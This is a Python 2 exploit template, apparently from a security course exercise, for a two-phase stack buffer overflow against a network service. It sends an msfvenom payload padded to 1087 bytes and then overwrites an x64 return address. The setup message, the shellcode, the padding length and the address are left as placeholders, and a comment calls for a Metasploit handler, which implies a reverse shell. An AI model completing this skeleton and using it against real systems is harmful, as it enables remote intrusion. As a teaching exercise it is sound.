#!/usr/bin/python2

# IMPORTANT: Don't forget to start your handler in Metasploit on Kali!!!

from struct import pack
import socket
import sys
import time

def exploit():
    print 'creating connection...'
    target_port = int(sys.argv[2])
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((sys.argv[1], target_port))

    print 'performing setup...'

    # We need to connect as a legitimate user before we can exploit the vulnerability.
    # Imitate the protocol to start a connection.
    sock.sendall("PLACE MESSAGE HERE")
    time.sleep(1)

    print 'sending payload...'

    # Copy the exploit that you generated using msfvenom here
    buf = ''

    print 'sending phase 1!'
    # In case you were wondering, 1087 is the size of message-1
    sock.sendall( buf + 'A'*(1087 - len(buf)) )
    time.sleep(1)

    print 'sending phase 2!'

    # What padding should we use to make sure we're overwriting the return address
    # in the correct spot? Hint: We've already written 1087 bytes
    phase2 = 'A'*(????)

    # Place the new return address here, replacing the -'s. Remember, an address in x64 is
    # 8 bytes or 16 hex characters! Make sure to fill the the extra in the beginning with 0s!
    #
    # Ex. If you're returning to address 0x7ffffdad, we would need to set this to:
    #     0x000000007ffffdad to fill up all 16 hex characters.
    phase2 += pack('<Q', 0x----------------)

    sock.sendall(phase2)
    sock.close()

if __name__ == '__main__':

    if len(sys.argv) != 3:
        sys.exit("Usage: %s <target_hostname> <target_port>" % sys.argv[0])

    exploit()
